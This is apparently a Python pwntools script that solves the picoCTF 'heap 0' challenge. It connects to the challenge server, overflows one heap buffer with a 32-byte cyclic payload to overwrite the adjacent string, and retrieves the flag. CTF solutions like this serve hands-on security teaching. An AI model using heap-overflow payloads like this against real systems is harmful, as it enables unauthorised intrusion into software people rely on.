# picoCTF-heap-0-exploit.py
# by Aidan Wech (ahwech)
# nc tethys.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "tethys.picoctf.net"
    port = 50523

    # variables
    buffsize = 32                                               # distance between two heap strings
    payload = flat(cyclic(buffsize))                            # overwrite the second str

    # connect to instance and deliver payload
    p = remote(host, port)
    p.recvuntil(b'choice: ', timeout=1)                         # heap options menu
    p.sendline(b'2')                                            # write to str1
    p.recvuntil(b'buffer: ', timeout=1)                         # enter buffer prompt
    p.sendline(payload)                                         # deliver payload
    p.recvuntil(b'choice: ', timeout=1)                         # heap options menu
    p.sendline(b'4')                                            # print flag
    p.recvuntil(b'YOU WIN\n', timeout=1)                        
    flag = p.recvline(timeout=1).decode('utf-8').rstrip('\n')   # obtain flag
    p.close()

    # print flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()